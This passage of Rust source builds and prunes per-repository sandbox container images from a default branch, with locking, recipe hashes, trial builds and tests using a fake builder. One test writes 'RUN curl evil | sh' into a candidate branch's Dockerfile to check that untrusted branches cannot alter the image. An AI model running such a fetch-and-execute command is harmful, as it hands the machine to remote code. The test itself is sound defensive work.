    if crate::mesh::recipe::held(store, &entry).is_some() {
        tracing::warn!(repo = %repo.display(), "base cache not warmed: the entry is held");
        return;
    }
    let secrets = match lend(cfg, repo, &entry) {
        Ok(secrets) => secrets,
        Err(error) => {
            tracing::warn!(repo = %repo.display(), %error, "no snapshot made");
            return;
        }
    };
    let warmed =
        crate::sandbox_images::warm_after(backend, cfg, store, repo, &environment, &secrets, seen);
    if let Err(error) = warmed.await {
        tracing::warn!(repo = %repo.display(), %error, "no snapshot made");
    }
}

/// What the default branch's preparation is lent: the entry's
/// `prepare_credentials`, as environment or attached by the node.
fn lend(
    cfg: &Config,
    repo: &Path,
    entry: &Repo,
) -> Result<crate::environment::PrepareSecrets, String> {
    let lent = &entry.prepare_credentials;
    let upstreams = cfg.live().upstreams.clone();
    Ok(match upstreams.preparation {
        crate::config::PreparationLending::Env => crate::environment::PrepareSecrets::new(
            crate::broker::preparation_env_for(repo, lent)
                .map_err(|error| format!("prepare_credentials: {error}"))?,
        ),
        crate::config::PreparationLending::Attach => crate::environment::PrepareSecrets::attached(
            crate::broker::preparation_attachments_for(repo, lent, &upstreams)
                .map_err(|error| format!("prepare_credentials: {error}"))?,
        ),
    })
}

/// The environment a run in `repo` gets, with its image built first if the
/// entry names a Dockerfile. A build that fails leaves whatever
/// `environment_for` still resolves: the last image that built, or the
/// harness image with that said. `Err` is a repository this node refuses
/// ([`refusal`]): nothing runs for it.
pub async fn environment(
    backend: &dyn Backend,
    cfg: &Config,
    store: &Store,
    repo: Option<&Path>,
) -> Result<crate::environment::RepoEnvironment, String> {
    if let Some(repo) = repo {
        let repos = cfg.repos();
        if let Some(entry) = repos.iter().find(|entry| entry.matches(repo)) {
            if let Some(refused) = refusal(repo, entry).await {
                return Err(refused);
            }
        }
        ensure_base(backend, cfg, store, repo, false).await;
    }
    let mut environment = crate::environment::environment_for(cfg, store, repo);
    if let Some(repo) = repo {
        if let Some(snapshot) =
            crate::sandbox_images::snapshot_for(backend, cfg, store, repo, &environment, false)
                .await
        {
            environment.image = snapshot;
            environment.image_source = crate::sandbox_images::SNAPSHOT_SOURCE;
        }
    }
    Ok(environment)
}

/// `warm_in` warms the base cache in an image this builds, before the build
/// counts as finished and with its lock still held: a request that comes
/// during the warm-up joins this build instead of building the recipe again
/// and moving its tag off the image the warm-up, and whoever asked first,
/// were given.
#[allow(clippy::too_many_arguments)]
async fn ensure_with(
    builder: &dyn ImageBuilder,
    runner: &dyn Runner,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    entry: &Repo,
    commands: &[String],
    force: bool,
    warm_in: Option<&dyn Backend>,
) -> Ensured {
    let lock = build_lock(repo);
    let seen = finished_count(repo);
    let _building = lock.lock().await;
    let repo_path = repo.to_string_lossy();
    let ready = match store.ready_repo_image(&repo_path, BASE) {
        Ok(ready) => ready,
        Err(error) => {
            return Ensured::Unavailable {
                reason: error.to_string(),
            }
        }
    };
    // An image the runtime pruned is not one a run can use. One a registry
    // could not be asked about is used as it stands.
    let presence = match &ready {
        Some(row) => builder.presence(&row.image).await,
        None => Presence::Absent,
    };
    let standing = ready.filter(|_| presence != Presence::Absent);
    let fallback = |error: String| match &standing {
        Some(row) => Ensured::Stale {
            using: row.image.clone(),
            error,
        },
        None => Ensured::Unavailable { reason: error },
    };
    let recipe = match recipe(repo, entry, &RunAs::sandbox()).await {
        Ok(recipe) => recipe,
        Err(error) => return fallback(error),
    };
    // A build of this same recipe finished while this request waited for the
    // lock: forced or not, it joins that one. Building it again would make a
    // second image of the same recipe, which BuildKit does not reproduce
    // byte for byte, and pin it under a cache warmed in the first.
    if let Some(ensured) = joined(repo, &recipe.hash, seen) {
        return ensured;
    }
    // A trial the operator allowed may already have built this recipe.
    let mut tried = None;
    if !force {
        if let Some(row) = standing
            .as_ref()
            .filter(|row| row.recipe_hash == recipe.hash)
        {
            return Ensured::Current(row.image.clone());
        }
        if presence == Presence::Unknown {
            return fallback(
                "the image builder could not say whether the repository's image is still there; \
                 it is used as it stands and not rebuilt until it can"
                    .into(),
            );
        }
        tried = built_for_trial(builder, store, repo, &recipe.hash).await;
        let latest = store.latest_repo_image(&repo_path, BASE).ok().flatten();
        if let Some(failed) = latest.filter(|row| {
            tried.is_none() && row.status == "failed" && row.recipe_hash == recipe.hash
        }) {
            return fallback(format!("{}; `tracon repo build` tries again", failed.error));
        }
    }
    // A builder that cannot build says so before a tree is staged or a build
    // is recorded against the recipe.
    // One that could not a moment ago is left alone for a while, unless
    // the operator asks.
    if tried.is_none() {
        if !force {
            if let Some(why) = cooling(repo, &recipe.hash) {
                return fallback(why);
            }
        }
        if let Some(why) = builder.unavailable().await {
            return fallback(cool(repo, &recipe.hash, &why));
        }
    }
    let started = RepoImageStart {
        repo_path: &repo_path,
        kind: BASE,
        recipe_hash: &recipe.hash,
        source_ref: &recipe.source_ref,
        source_commit: &recipe.source_commit,
        parent_image: "",
    };
    let id = match store.start_repo_image(&started) {
        Ok(id) => id,
        Err(error) => return fallback(error.to_string()),
    };
    let built = match tried {
        Some(tried) => Ok(tried),
        None => {
            tracing::info!(repo = %repo.display(), recipe = %recipe.hash, "building repository image");
            build(builder, cfg, store, repo, &recipe, &id).await
        }
    };
    match built {
        Ok(built) => {
            let warnings = missing_tools(runner, &built.image.image, commands).await;
            let _ = store.finish_repo_image(
                &id,
                Ok(&built.image.image),
                &built.image.log_tail,
                &warnings,
            );
            let _ = store.set_repo_image_parent(&id, &built.source);
            warm(repo, &recipe.hash);
            supersede(builder, store, repo, BASE).await;
            if let Some(backend) = warm_in {
                let _settling = Settling::start(repo, &recipe.hash);
                warm_base_cache(backend, cfg, store, repo).await;
            }
            let ensured = Ensured::Rebuilt(built.image.image);
            record_finished(repo, &recipe.hash, &ensured);
            ensured
        }
        Err(failure) => {
            tracing::warn!(repo = %repo.display(), error = %failure.error, "repository image build failed");
            settle_failure(store, &id, &failure);
            let ensured = match failure.transient {
                true => fallback(cool(repo, &recipe.hash, &failure.error)),
                false => fallback(failure.error),
            };
            record_finished(repo, &recipe.hash, &ensured);
            ensured
        }
    }
}

/// Record a build that failed. One the builder failed (`transient`) is
/// dropped instead of recorded: it says nothing about the recipe, and a
/// recorded failure would stand against the recipe until the operator asked
/// again.
fn settle_failure(store: &Store, id: &str, failure: &BuildFailure) {
    let _ = match failure.transient {
        true => store.abandon_repo_image(id),
        false => store.finish_repo_image(id, Err(&failure.error), &failure.log_tail, &[]),
    };
}

/// Remove what a finished build of `kind` superseded: the build before it,
/// or, for a builder that keeps a previous generation (a registry a pod may
/// still be about to pull from), the build before that. Nothing a kept build
/// of any kind still names is removed, as its image or as the image it
/// stands on, and nothing this node did not build: a snapshot's image is
/// removed with it only when it is a repository image of this node's, never
/// the stock base.
pub(crate) async fn supersede(builder: &dyn ImageBuilder, store: &Store, repo: &Path, kind: &str) {
    let depth = match builder.retains_previous() {
        true => 2,
        false => 1,
    };
    let Ok(rows) = store.ready_repo_images(&repo.to_string_lossy()) else {
        return;
    };
    let mut seen: HashMap<&str, usize> = HashMap::new();
    let mut kept: std::collections::HashSet<&str> = Default::default();
    let mut kept_recipes: std::collections::HashSet<&str> = Default::default();
    let mut victim = None;
    for row in &rows {
        let count = seen.entry(row.kind.as_str()).or_default();
        if *count < depth {
            kept.insert(row.image.as_str());
            kept.insert(row.parent_image.as_str());
            if row.kind == BASE || row.kind == TRIAL {
                kept_recipes.insert(row.recipe_hash.as_str());
            }
        } else if *count == depth && row.kind == kind {
            victim = Some(row);
        }
        *count += 1;
    }
    let Some(victim) = victim else {
        return;
    };
    let mut doomed = vec![victim.image.clone()];
    if victim.kind == BASE || victim.kind == TRIAL {
        doomed.extend(source_of(repo, victim, &kept_recipes));
    } else {
        let parent = store
            .repo_image_built_as(&victim.parent_image)
            .ok()
            .flatten()
            .filter(|parent| parent.kind == BASE || parent.kind == TRIAL);
        if let Some(parent) = parent {
            doomed.push(parent.image.clone());
            doomed.extend(source_of(repo, &parent, &kept_recipes));
        }
    }
    for image in doomed {
        if !image.is_empty() && !kept.contains(image.as_str()) {
            builder.remove(&image).await;
        }
    }
}

/// The image a repository image was built from under the node's layer: by
/// the digest recorded with it, or, for a build from before that was
/// recorded, by its tag, unless a kept build of the same recipe has since
/// moved that tag onto its own.
fn source_of(
    repo: &Path,
    row: &crate::store::RepoImageRow,
    kept_recipes: &std::collections::HashSet<&str>,
) -> Option<String> {
    if !row.parent_image.is_empty() {
        return Some(row.parent_image.clone());
    }
    (!kept_recipes.contains(row.recipe_hash.as_str()))
        .then(|| legacy_source_tag(repo, &row.recipe_hash))
}

/// The image a trial built from `recipe_hash`, if the runtime still holds it.
async fn built_for_trial(
    builder: &dyn ImageBuilder,
    store: &Store,
    repo: &Path,
    recipe_hash: &str,
) -> Option<Built> {
    let row = store
        .ready_repo_image(&repo.to_string_lossy(), TRIAL)
        .ok()
        .flatten()
        .filter(|row| row.recipe_hash == recipe_hash)?;
    (builder.presence(&row.image).await != Presence::Absent).then_some(Built {
        image: BuiltImage {
            image: row.image,
            log_tail: row.log_tail,
        },
        source: row.parent_image,
    })
}

/// An image this node already built from `recipe_hash`, which a trial of the
/// same Dockerfile and context runs in without building anything: the
/// repository's own, or one an earlier trial built.
pub async fn already_built(
    builder: &dyn ImageBuilder,
    store: &Store,
    repo: &Path,
    recipe_hash: &str,
) -> Option<String> {
    let base = store
        .ready_repo_image(&repo.to_string_lossy(), BASE)
        .ok()
        .flatten()
        .filter(|row| row.recipe_hash == recipe_hash);
    if let Some(row) = base {
        if builder.presence(&row.image).await != Presence::Absent {
            return Some(row.image);
        }
    }
    built_for_trial(builder, store, repo, recipe_hash)
        .await
        .map(|built| built.image.image)
}

/// Build `recipe` for a trial of a drafted entry, exactly as `ensure_base`
/// would build it, and record it as the repository's `TRIAL` image. Nothing
/// runs a repository's checks or sessions in it; an entry with this recipe
/// adopts it later rather than building it again.
///
/// A build runs with the network, outside the boundary, so only a trial the
/// operator allowed calls this. Only the newest trial image is kept.
pub async fn build_for_trial(
    builder: &dyn ImageBuilder,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    recipe: &Recipe,
) -> Result<BuiltImage, BuildFailure> {
    let failed = |error: String| BuildFailure {
        error,
        log_tail: String::new(),
        ..Default::default()
    };
    let lock = build_lock(repo);
    let _building = lock.lock().await;
    // Built while this waited for the lock: by an earlier trial, or by the
    // repository's own entry.
    if let Some(image) = already_built(builder, store, repo, &recipe.hash).await {
        return Ok(BuiltImage {
            image,
            log_tail: String::new(),
        });
    }
    if let Some(why) = builder.unavailable().await {
        return Err(BuildFailure::transient(why));
    }
    let repo_path = repo.to_string_lossy();
    let started = RepoImageStart {
        repo_path: &repo_path,
        kind: TRIAL,
        recipe_hash: &recipe.hash,
        source_ref: &recipe.source_ref,
        source_commit: &recipe.source_commit,
        parent_image: "",
    };
    let id = store
        .start_repo_image(&started)
        .map_err(|error| failed(error.to_string()))?;
    tracing::info!(repo = %repo.display(), recipe = %recipe.hash, "building repository image for a trial");
    match build(builder, cfg, store, repo, recipe, &id).await {
        Ok(built) => {
            let _ =
                store.finish_repo_image(&id, Ok(&built.image.image), &built.image.log_tail, &[]);
            let _ = store.set_repo_image_parent(&id, &built.source);
            // The trial image this replaces, unless the repository's own
            // entry has since adopted it: an adopted image is a kept build's.
            supersede(builder, store, repo, TRIAL).await;
            Ok(built.image)
        }
        Err(failure) => {
            tracing::warn!(repo = %repo.display(), error = %failure.error, "trial image build failed");
            settle_failure(store, &id, &failure);
            Err(failure)
        }
    }
}

/// A directory to stage one build in, where the builder wants it.
fn stage_dir(builder: &dyn ImageBuilder) -> std::io::Result<tempfile::TempDir> {
    match builder.scratch_dir() {
        Some(scratch) => {
            std::fs::create_dir_all(&scratch)?;
            tempfile::tempdir_in(scratch)
        }
        None => tempfile::tempdir(),
    }
}

/// The image a build of `recipe_hash` recorded as `build` is built from,
/// under the node's layer.
fn source_tag(repo: &Path, recipe_hash: &str, build: &str) -> String {
    build_tag(&format!("{}-src", image_name(repo)), recipe_hash, build)
}

/// The tag every build of `recipe_hash` shared before each build had its
/// own, which a build from then that recorded no source image is found by.
fn legacy_source_tag(repo: &Path, recipe_hash: &str) -> String {
    format!(
        "{}-src:{}",
        image_name(repo),
        &recipe_hash[..recipe_hash.len().min(12)]
    )
}

/// What `build` produced: the repository's image, and the image built from
/// its Dockerfile that the node's layer stands on.
struct Built {
    image: BuiltImage,
    source: String,
}

/// Build the repository's own image from its default branch, then the node's
/// layer over it. The context is materialized from Git objects into a
/// directory of the node's; nothing the working tree holds is in it. `id`
/// is the row the build is recorded as, which its tags carry
/// ([`build_tag`]).
async fn build(
    builder: &dyn ImageBuilder,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    recipe: &Recipe,
    id: &str,
) -> Result<Built, BuildFailure> {
    let begun = std::time::Instant::now();
    let built = match recipe.steps.is_empty() {
        true => build_base(builder, cfg, store, repo, recipe, id).await,
        false => build_steps(builder, repo, recipe, id).await,
    };
    count_build(BASE, repo, built.as_ref().err(), begun);
    built
}

async fn build_base(
    builder: &dyn ImageBuilder,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    recipe: &Recipe,
    id: &str,
) -> Result<Built, BuildFailure> {
    let staged = |error: String| BuildFailure {
        error,
        log_tail: String::new(),
        ..Default::default()
    };
    let dir = repo.to_string_lossy();
    let stage = stage_dir(builder).map_err(|e| staged(e.to_string()))?;
    let dockerfile = crate::review::blob(
        &dir,
        &format!("{}:{}", recipe.source_commit, recipe.dockerfile),
    )
    .await
    .map_err(|e| staged(e.to_string()))?;
    let containerfile = stage.path().join("Containerfile");
    let dockerfile = match crate::sandbox_images::active_base() {
        Some(base) => with_base_arg(&dockerfile, &base),
        None => dockerfile,
    };
    std::fs::write(&containerfile, dockerfile).map_err(|e| staged(e.to_string()))?;
    let scratch = builder.scratch_dir().unwrap_or_else(std::env::temp_dir);
    let context = crate::review::snapshot_candidate_in(
        &scratch,
        &dir,
        &recipe.context_tree,
        cfg.live().supervision.max_snapshot_bytes,
    )
    .await
    .map_err(|e| staged(format!("build context: {e}")))?;
    let labels = build_labels(&recipe.hash);
    let source = builder
        .build(ImageBuild {
            tag: &source_tag(repo, &recipe.hash, id),
            containerfile: &containerfile,
            context: &context.root,
            labels: &labels,
            timeout: BUILD_TIMEOUT,
        })
        .await?;

    let layer = stage.path().join("Normalised.Containerfile");
    std::fs::write(&layer, normalised(&source.image, &RunAs::sandbox()))
        .map_err(|e| staged(e.to_string()))?;
    let empty = stage.path().join("empty");
    std::fs::create_dir_all(&empty).map_err(|e| staged(e.to_string()))?;
    let built = match builder
        .build(ImageBuild {
            tag: &build_tag(&image_name(repo), &recipe.hash, id),
            containerfile: &layer,
            context: &empty,
            labels: &labels,
            timeout: BUILD_TIMEOUT,
        })
        .await
    {
        Ok(built) => built,
        Err(failure) => {
            // Nothing will stand on it, unless a build that stands already
            // does: a cached rebuild can produce the very same source image.
            let stands = store
                .ready_repo_images(&repo.to_string_lossy())
                .map(|rows| rows.iter().any(|row| row.parent_image == source.image))
                .unwrap_or(true);
            if !stands {
                builder.remove(&source.image).await;
            }
            return Err(failure);
        }
    };
    // The repository's own build is the one worth reading; the layer over it
    // prints a few lines at most.
    Ok(Built {
        image: BuiltImage {
            image: built.image,
            log_tail: source.log_tail,
        },
        source: source.image,
    })
}

/// `dockerfile` with the pinned stock base declared ahead of its first
/// `FROM`, so `FROM ${TRACON_SANDBOX_BASE}` builds on it. After any parser
/// directives, which must stay first.
fn with_base_arg(dockerfile: &[u8], base: &str) -> Vec<u8> {
    let text = String::from_utf8_lossy(dockerfile);
    let mut at = 0;
    for line in text.split_inclusive('\n') {
        let directive = line
            .trim()
            .strip_prefix('#')
            .map(|rest| {
                let rest = rest.trim_start().to_ascii_lowercase();
                ["syntax", "escape", "check"].iter().any(|name| {
                    rest.strip_prefix(name)
                        .is_some_and(|after| after.trim_start().starts_with('='))
                })
            })
            .unwrap_or(false);
        if !directive {
            break;
        }
        at += line.len();
    }
    let mut out = text[..at].to_string();
    if !out.is_empty() && !out.ends_with('\n') {
        out.push('\n');
    }
    out.push_str(&format!("ARG {}={base}\n", crate::sandbox_images::BASE_ARG));
    out.push_str(&text[at..]);
    out.into_bytes()
}

/// Bumped when `steps_containerfile` changes what it writes, so every
/// repository built from steps is built again.
const STEPS_SCHEME: &str = "steps-2";

/// Why an entry's `build` steps have no recipe yet.
const STEPS_UNPINNED: &str = "build steps stand on the stock sandbox base, which this node \
     has not pinned yet: it pins it when the boundary converges";

/// The recipe of an entry's `build` steps on `base`, the pinned stock base.
/// What the image is built from is the base and the steps alone (there is no
/// build context), and the hosts the steps may reach: a host added after a
/// build failed for want of it is a new recipe, built without being asked.
async fn steps_recipe(repo: &Path, entry: &Repo, base: &str) -> Result<Recipe, String> {
    let steps_egress = entry.egress_hosts()?;
    let mut hash = Sha256::new();
    let mut part = |text: &str| {
        hash.update(text.as_bytes());
        hash.update([0]);
    };
    part(STEPS_SCHEME);
    part(base);
    part("build");
    for step in &entry.build {
        part(step);
    }
    part("egress");
    for host in &steps_egress {
        part(host);
    }
    // Recorded with the build, not part of it: a repository with no commit
    // yet still has an image.
    let (source_ref, source_commit) = default_commit(repo).await.unwrap_or_default();
    Ok(Recipe {
        dockerfile: String::new(),
        context: String::new(),
        source_ref,
        source_commit,
        context_tree: String::new(),
        hash: hex::encode(hash.finalize()),
        steps: entry.build.clone(),
        steps_base: base.to_string(),
        steps_egress,
    })
}

/// The Containerfile `steps` are built from: each a `RUN` of its own as
/// root, so a failure names the step, in exec form so a step's quotes and
/// newlines reach the shell as written; then back to the base's own user,
/// home and directory, as every sandbox runs. The steps run with root's own
/// home, so a tool that writes under `$HOME` (`uv`'s cache, say) leaves
/// nothing root owns in the harness's.
pub(crate) fn steps_containerfile(base: &str, steps: &[String]) -> String {
    let mut out = format!("FROM {base}\nUSER 0:0\nENV HOME=/root\n");
    for step in steps {
        let argv = serde_json::json!(["/bin/sh", "-ec", step]);
        out.push_str(&format!("RUN {argv}\n"));
    }
    out.push_str(&format!(
        "USER {}\nENV HOME={}\nWORKDIR /work\n",
        crate::sandbox_images::USER,
        crate::sandbox_images::HOME
    ));
    out
}

/// Build the repository's image from its `build` steps: one image, the base
/// and the steps, with nothing layered over it. The steps reach only the
/// recipe's hosts, where the builder can hold them to that.
async fn build_steps(
    builder: &dyn ImageBuilder,
    repo: &Path,
    recipe: &Recipe,
    id: &str,
) -> Result<Built, BuildFailure> {
    let staged = |error: String| BuildFailure {
        error,
        log_tail: String::new(),
        ..Default::default()
    };
    let stage = stage_dir(builder).map_err(|e| staged(e.to_string()))?;
    let containerfile = stage.path().join("Steps.Containerfile");
    std::fs::write(
        &containerfile,
        steps_containerfile(&recipe.steps_base, &recipe.steps),
    )
    .map_err(|e| staged(e.to_string()))?;
    let empty = stage.path().join("empty");
    std::fs::create_dir_all(&empty).map_err(|e| staged(e.to_string()))?;
    let built = builder
        .build_steps(
            ImageBuild {
                tag: &build_tag(&image_name(repo), &recipe.hash, id),
                containerfile: &containerfile,
                context: &empty,
                labels: &build_labels(&recipe.hash),
                timeout: BUILD_TIMEOUT,
            },
            &crate::boundary::StepsBuild {
                base: &recipe.steps_base,
                steps: &recipe.steps,
                hosts: &recipe.steps_egress,
            },
        )
        .await?;
    // No source image: the base is not this node's to remove with it.
    Ok(Built {
        image: built,
        source: String::new(),
    })
}

/// The commands whose first word the image has no tool for, so the operator
/// hears it when the image is built rather than from a check that could not
/// run. A probe that cannot run says nothing.
async fn missing_tools(runner: &dyn Runner, image: &str, commands: &[String]) -> Vec<String> {
    let mut tools: Vec<&str> = Vec::new();
    for command in commands {
        // An assignment or a path is not a tool the image is expected to hold.
        match command.split_whitespace().next() {
            Some(word) if !word.contains(['=', '/']) && !tools.contains(&word) => tools.push(word),
            _ => {}
        }
    }
    if tools.is_empty() {
        return Vec::new();
    }
    let mut argv: Vec<String> = [
        "sh",
        "-lc",
        "for tool in \"$@\"; do command -v \"$tool\" >/dev/null 2>&1 || echo \"$tool\"; done",
        "sh",
    ]
    .map(String::from)
    .to_vec();
    argv.extend(tools.iter().map(|tool| tool.to_string()));
    let out = runner
        .run_probe(RunnerCommand {
            argv,
            image: Some(image.to_string()),
            name: crate::config::resource_name(&format!("probe-{}", uuid::Uuid::now_v7().simple())),
            labels: crate::runner::RunLabels::of(crate::runner::RunKind::Probe),
            ..Default::default()
        })
        .await;
    let Ok(out) = out else {
        return Vec::new();
    };
    let missing = String::from_utf8_lossy(&out.stdout);
    commands
        .iter()
        .filter(|command| {
            command
                .split_whitespace()
                .next()
                .is_some_and(|word| missing.lines().any(|line| line.trim() == word))
        })
        .cloned()
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runner::local::LocalRunner;
    use async_trait::async_trait;

    #[test]
    fn a_session_elsewhere_reports_the_image_its_template_was_made_from() {
        let base = "ghcr.io/cosmicspork/tracon-sandbox-base@sha256:c9d6";
        let snapshot = format!(
            "localhost/{}-snapshot-mesa-fb857314f4@sha256:ece8",
            crate::config::resource_prefix()
        );
        assert_eq!(
            source_elsewhere(&snapshot, base),
            crate::sandbox_images::SNAPSHOT_SOURCE
        );
        assert_eq!(source_elsewhere(base, base), STOCK_BASE);
        assert_eq!(
            source_elsewhere("registry.example/team/sandbox@sha256:aaaa", base),
            OPERATOR_IMAGE
        );
    }

    /// Records what it was asked to build and reads the Containerfile and
    /// context while they still exist, as a real build would.
    #[derive(Default)]
    struct FakeBuilder {
        builds: StdMutex<Vec<(String, String, Vec<String>)>>,
        removed: StdMutex<Vec<String>>,
        fail: StdMutex<bool>,
        /// What a failing build's log ends with, where not the default.
        fail_log: StdMutex<Option<String>>,
        pruned: StdMutex<bool>,
        /// Fail as a builder that cannot build, not as a recipe.
        broken: StdMutex<bool>,
        /// What `unavailable` says.
        down: StdMutex<Option<String>>,
        /// Whether the store can be asked about images.
        unknown: StdMutex<bool>,
        /// Keep a previous generation, as a registry does.
        retains: bool,
        /// Give the same build the same digest every time, as a cache does.
        same_digest: bool,
        /// Fail every build from this many builds on.
        fail_from: StdMutex<Option<usize>>,
        /// Find no image by tag, as a registry that holds none.
        missing: StdMutex<bool>,
        /// Take this long over every build, as a real one does.
        slow: StdMutex<Option<Duration>>,
        /// How many warm-ups `Pulling` imported a tree for, and how long
        /// each import takes.
        warms: StdMutex<usize>,
        warming: Option<Duration>,
        /// The hosts each build held to an egress grant was given.
        egress: StdMutex<Vec<Vec<String>>>,
        /// Model an image store's tags: `name:tag` names the image last
        /// built under it, and `name@sha256:…` resolves only while a tag of
        /// that name still names the image, as Podman's does.
        tagged: bool,
        tags: StdMutex<HashMap<String, String>>,
    }

    impl FakeBuilder {
        /// Whether the modelled store still resolves `image`.
        fn resolves(&self, image: &str) -> bool {
            let tags = self.tags.lock().unwrap();
            match image.contains('@') {
                true => tags.values().any(|pinned| pinned == image),
                false => tags.contains_key(image),
            }
        }
    }

    #[async_trait]
    impl ImageBuilder for FakeBuilder {
        async fn build_with_egress(
            &self,
            build: ImageBuild<'_>,
            hosts: &[String],
        ) -> Result<BuiltImage, BuildFailure> {
            self.egress.lock().unwrap().push(hosts.to_vec());
            self.build(build).await
        }
        async fn build(&self, build: ImageBuild<'_>) -> Result<BuiltImage, BuildFailure> {
            let slow = *self.slow.lock().unwrap();
            if let Some(slow) = slow {
                tokio::time::sleep(slow).await;
            }
            if *self.broken.lock().unwrap() {
                return Err(BuildFailure::transient("buildkitd did not answer"));
            }
            let failing = (*self.fail_from.lock().unwrap())
                .is_some_and(|from| self.builds.lock().unwrap().len() >= from);
            if failing {
                return Err(BuildFailure {
                    error: "the layer did not build".into(),
                    ..Default::default()
                });
            }
            if *self.fail.lock().unwrap() {
                return Err(BuildFailure {
                    error: "podman build exited 1".into(),
                    log_tail: self
                        .fail_log
                        .lock()
                        .unwrap()
                        .clone()
                        .unwrap_or_else(|| "Error: no such package".into()),
                    ..Default::default()
                });
            }
            let text = std::fs::read_to_string(build.containerfile).unwrap();
            let mut files: Vec<String> = std::fs::read_dir(build.context)
                .unwrap()
                .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
                .collect();
            files.sort();
            let name = build.tag.rsplit_once(':').unwrap().0.to_string();
            // Every build its own digest, as a real one with a timestamp is.
            let count = match self.same_digest {
                true => 0,
                false => self.builds.lock().unwrap().len(),
            };
            // A digest is the image's, not its tag's.
            let digest = hex::encode(Sha256::digest(format!("{name}{text}{count}")));
            self.builds
                .lock()
                .unwrap()
                .push((build.tag.to_string(), text, files));
            let image = format!("{name}@sha256:{digest}");
            self.tags
                .lock()
                .unwrap()
                .insert(build.tag.to_string(), image.clone());
            Ok(BuiltImage {
                image,
                log_tail: "built".into(),
            })
        }
        async fn exists(&self, image: &str) -> bool {
            !*self.pruned.lock().unwrap() && (!self.tagged || self.resolves(image))
        }
        async fn identity(&self, image: &str) -> Option<String> {
            if *self.missing.lock().unwrap() {
                return None;
            }
            let digest = hex::encode(Sha256::digest(image));
            Some(format!("{image}@sha256:{digest}"))
        }
        async fn remove(&self, image: &str) {
            self.removed.lock().unwrap().push(image.to_string());
        }
        async fn presence(&self, image: &str) -> Presence {
            let unknown = *self.unknown.lock().unwrap();
            match unknown {
                true => Presence::Unknown,
                false => match self.exists(image).await {
                    true => Presence::Present,
                    false => Presence::Absent,
                },
            }
        }
        async fn unavailable(&self) -> Option<String> {
            self.down.lock().unwrap().clone()
        }
        fn retains_previous(&self) -> bool {
            self.retains
        }
    }

    fn sh(dir: &Path, script: &str) {
        let status = std::process::Command::new("sh")
            .arg("-c")
            .arg(script)
            .current_dir(dir)
            .status()
            .unwrap();
        assert!(status.success(), "{script}");
    }

    /// A checkout whose default branch holds a Dockerfile and one file beside
    /// it, with `origin/HEAD` where a clone would have it.
    fn checkout() -> tempfile::TempDir {
        let tmp = tempfile::tempdir().unwrap();
        sh(
            tmp.path(),
            "git init -q -b main . && git config user.email t@e && git config user.name t \
             && mkdir .devcontainer && printf 'FROM ${TRACON_SANDBOX_BASE}\\nCOPY tool.conf /etc/\\n' > .devcontainer/Dockerfile \
             && echo a > .devcontainer/tool.conf && echo one > src.txt \
             && git add -A && git commit -qm one \
             && git update-ref refs/remotes/origin/main HEAD \
             && git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main",
        );
        tmp
    }

    fn entry(repo: &Path) -> Repo {
        Repo {
            path: repo.to_path_buf(),
            dockerfile: Some(".devcontainer/Dockerfile".into()),
            ..Default::default()
        }
    }

    async fn ensure(builder: &FakeBuilder, store: &Store, repo: &Path, force: bool) -> Ensured {
        ensure_with(
            builder,
            &LocalRunner,
            &Config::pod_hosted(),
            store,
            repo,
            &entry(repo),
            &[],
            force,
            None,
        )
        .await
    }

    /// The image follows the Dockerfile and its context on the default branch
    /// and nothing else: other commits leave it alone, and neither a
    /// candidate's branch nor the working tree can reach it.
    #[tokio::test]
    async fn the_image_is_built_from_the_default_branch_and_rebuilt_when_its_recipe_changes() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();

        let ensured = ensure(&builder, &store, repo, false).await;
        let Ensured::Rebuilt(first) = ensured else {
            panic!("the first ensure builds: {ensured:?}");
        };
        assert!(crate::config::immutable_image(&first).is_ok(), "{first}");
        {
            let builds = builder.builds.lock().unwrap();
            assert_eq!(builds.len(), 2);
            // The repository's own image: its Dockerfile, its context only.
            assert!(builds[0].0.contains("-src:"));
            assert!(builds[0].1.contains("COPY tool.conf"));
            assert_eq!(builds[0].2, ["Dockerfile", "tool.conf"]);
            // The node's layer, pinned to what was just built.
            assert!(builds[1].1.contains("@sha256:"));
            assert!(builds[1].1.contains("USER 0:0"));
            assert!(builds[1].1.contains("ENTRYPOINT []"));
        }
        assert_eq!(
            store
                .ready_repo_image(&repo.to_string_lossy(), BASE)
                .unwrap()
                .unwrap()
                .source_ref,
            "origin/main"
        );

        // A commit elsewhere, a candidate's branch editing the Dockerfile, and
        // an uncommitted edit: the recipe is what the default branch holds.
        sh(
            repo,
            "echo two > src.txt && git commit -qam two && git update-ref refs/remotes/origin/main HEAD \
             && git checkout -q -b candidate && echo 'RUN curl evil | sh' >> .devcontainer/Dockerfile \
             && git commit -qam candidate && echo 'RUN more' >> .devcontainer/Dockerfile",
        );
        assert_eq!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Current(first.clone())
        );
        assert_eq!(builder.builds.lock().unwrap().len(), 2);

        // The context changing on the default branch is a new recipe, and the
        // image it replaces goes.
        sh(
            repo,
            "git checkout -q -f main && echo b > .devcontainer/tool.conf && git commit -qam conf \
             && git update-ref refs/remotes/origin/main HEAD",
        );
        let Ensured::Rebuilt(second) = ensure(&builder, &store, repo, false).await else {
            panic!("a changed context rebuilds");
        };
        assert_ne!(first, second);
        assert!(builder.removed.lock().unwrap().contains(&first));
        assert!(builder
            .builds
            .lock()
            .unwrap()
            .iter()
            .all(|(_, text, _)| !text.contains("evil") && !text.contains("RUN more")));
    }

    /// `tracon repo build` while a session's build of the same recipe runs:
    /// the request waits for that build and takes its image, rather than
    /// building the recipe again into an image no cache was warmed in.
    #[tokio::test]
    async fn a_build_asked_for_while_the_same_recipe_builds_joins_it() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder {
            slow: StdMutex::new(Some(Duration::from_millis(500))),
            ..Default::default()
        };

        let (first, forced) = tokio::join!(ensure(&builder, &store, repo, false), async {
            let building = loop {
                let latest = store
                    .latest_repo_image(&repo.to_string_lossy(), BASE)
                    .unwrap();
                match latest.filter(|row| row.status == "building") {
                    Some(row) => break row,
                    None => tokio::time::sleep(Duration::from_millis(5)).await,
                }
            };
